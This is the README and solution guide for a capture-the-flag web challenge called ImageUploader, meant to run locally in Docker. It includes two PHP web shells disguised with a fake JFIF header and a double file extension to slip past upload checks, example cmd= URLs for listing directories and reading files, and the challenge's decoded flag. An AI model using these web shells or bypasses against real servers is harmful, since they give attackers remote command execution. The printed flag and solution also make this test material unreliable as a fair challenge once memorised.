# ImageUploader CTF Challenge

## Challenge Details

### Category
- Web Security
- File Upload Vulnerability
- Command Injection
- Base64 Encoding

### Description
ImageUploader is a seemingly innocent image upload service that contains multiple security vulnerabilities. Participants must exploit file upload restrictions and use command injection to discover and decode a hidden flag.

## Hints 🔍
1. "Check the file extension - sometimes what you see isn't what you get..."
2. "A picture is worth a thousand words, but what if it contains code?"
3. "The flag is hidden deep within the server, but where exactly? Try exploring /var/hidden/"
4. "Remember to decode what you find - things aren't always what they seem!"
5. "JFIF might be useful in your journey..."

## Technical Details

### Security Flaws
1. **Insecure File Upload**
   - The application only checks file extensions
   - Double extension bypass possible (e.g., `shell.php.jpg`, `shell.php.png`, `shell.php.gif`)
   - No proper MIME type validation
   - Supports multiple image formats (jpg, jpeg, png, gif)

2. **Command Injection**
   - Uploaded PHP files are executed as PHP code
   - GET parameter allows arbitrary command execution

3. **Information Disclosure**
   - Directory listing enabled in uploads folder
   - Base64 encoded flag stored in predictable location

## Hosting Requirements

### Prerequisites
- Docker
- Docker Compose
- Git (optional)

### Installation & Deployment

1. **Clone the Repository**
```bash
git clone https://github.com/YASHRVY7/CTF7.git
cd CTF7
```

2. **Build and Run with Docker**
```bash
docker-compose up --build
```

3. **Access the Challenge**
- Open browser and navigate to: `http://localhost:8080`

## Solution Guide

### Step 1: Create Payload
Create a file with any of the following extensions: `.php.jpg`, `.php.jpeg`, `.php.png`, or `.php.gif`. For example:
```php
JFIF;
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
} else {
    echo "Usage: ?cmd=command";
}
?>
```

### Step 2: Upload and Execute
1. Upload the file (e.g., `shell.php.jpg`, `shell.php.png`, etc.) through the web interface
2. Navigate to `/uploads/[your-file-name]` in the browser

### Step 3: Find the Flag
This step involves exploring the server's file system to locate and retrieve the hidden flag. The process requires multiple commands and careful enumeration:

1. **Initial Directory Enumeration**
   ```
   # First, check the root of hidden directory
   http://localhost:8080/uploads/shell.php.jpg?cmd=ls -la /var/hidden/
   
   # Then explore level1 directory
   http://localhost:8080/uploads/shell.php.jpg?cmd=ls -la /var/hidden/level1/
   
   # Finally, check level2 directory
   http://localhost:8080/uploads/shell.php.jpg?cmd=ls -la /var/hidden/level1/level2/
   ```

   **Example Exploration Process:**
   1. First, list contents of /var directory:
   ```
   http://localhost:8080/uploads/shell.php.jpg?cmd=ls%20/var

   Expected Output:
   Command received: ls /var
   Executing...
   backups  cache  hidden  lib  local  lock  log  mail  opt  run  spool  tmp  www
   Return value: 0
   ```
   Note: The `hidden` directory in the output confirms our target location.

   2. Explore the hidden directory:
   ```
   http://localhost:8080/uploads/shell.php.jpg?cmd=ls%20/var/hidden

   Expected Output:
   Command received: ls /var/hidden
   Executing...
   level1
   Return value: 0
   ```
   This confirms the nested directory structure and guides our next steps.

2. **Advanced Enumeration Techniques**
   - If standard `ls` is blocked, try alternatives:
   ```
   # Using find command
   http://localhost:8080/uploads/shell.php.jpg?cmd=find /var/hidden -type f
   
   # Using dir command
   http://localhost:8080/uploads/shell.php.jpg?cmd=dir /var/hidden/level1/level2/
   ```

3. **Reading the Flag File**
   - Multiple methods to read the flag content:
   ```
   # Using cat
   http://localhost:8080/uploads/shell.php.jpg?cmd=cat /var/hidden/level1/level2/secret_flag.txt

   ```

## Available Hints
1. "Check the MIME type bypass techniques"
2. "The flag is hidden deeper than you think"
3. "Multiple encodings might be involved"


## Security Measures
- Apache mod_security enabled
- Security headers configured
- File extension validation
- Upload directory permissions set
- Flag file permissions restricted
- Base64 encoded flag

## Flag Format
- Encoded: `Q1RGe1RoMXNfMXNfWU91cl9GbDRnX0MwbmdyNHR6X1kwdV9GMHVuZF9JdH0=`
- Decoded: `CTF{Th1s_1s_YOur_Fl4g_C0ngr4tz_Y0u_F0und_It}`

## Payload Explanation

The payload (`shell.php.jpg`) is crafted to bypass upload restrictions and enable command execution. Let's break down each component:

### 1. File Name Structure
- `shell.php.jpg`: Uses double extension to bypass file type checks
  - The server sees `.jpg` and thinks it's an image
  - But PHP will still execute it as `.php` file

### 2. Content Breakdown
```php
JFIF;
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
} else {
    echo "Usage: ?cmd=command";
}
?>
```

#### Key Components:
1. **JFIF Header**
   - `JFIF;` at the start tricks MIME type checks
   - Makes the file look like a valid JPEG image

2. **PHP Code Section**
   - `isset($_GET['cmd'])`: Checks if a command was provided in URL
   - `system($_GET['cmd'])`: Directly executes and outputs the system command
   - Simple error message if no command is provided

3. **Output Structure**
   - Direct command output without additional formatting
   - Minimal and efficient execution
   - Clean and straightforward response

### Usage Example
```
http://localhost:8080/uploads/shell.php.jpg?cmd=whoami
```

### Security Implications
- Allows remote command execution
- Bypasses file upload restrictions
- Direct command output display
- Can be used to explore server filesystem
- Enables privilege escalation attempts

Note: This payload is for educational purposes in CTF challenges. Using such code in production environments would create serious security vulnerabilities.

### Alternative Shell Implementation (shell.php.jpg)
```php
JFIF;
<?php
// Simple shell with command execution
if(isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo "<pre>\n";
    echo "Command received: $cmd\n";
    echo "Executing...\n";
    $output = [];
    exec($cmd . " 2>&1", $output);
    echo "Output:\n";
    echo implode("\n", $output) . "\n";
    echo "</pre>";
} else {
    echo "No command provided. Use ?cmd=command";
}
?>
```

#### Key Features:
1. **Enhanced Output Formatting**
   - Uses `<pre>` tags for better output readability
   - Shows detailed execution steps and command status
   - Captures and formats both stdout and stderr (`2>&1`)

2. **Command Handling**
   - Uses `exec()` instead of `system()` for more controlled output
   - Stores output in array for better manipulation
   - Provides more verbose feedback about command execution

3. **User Experience**
   - More detailed error messages
   - Structured output presentation
   - Better debugging capabilities

### Usage Example
```
http://localhost:8080/uploads/shell.php.jpg?cmd=whoami
```

This version provides more verbose output and better formatting, which can be helpful for debugging or when more detailed command execution information is needed.
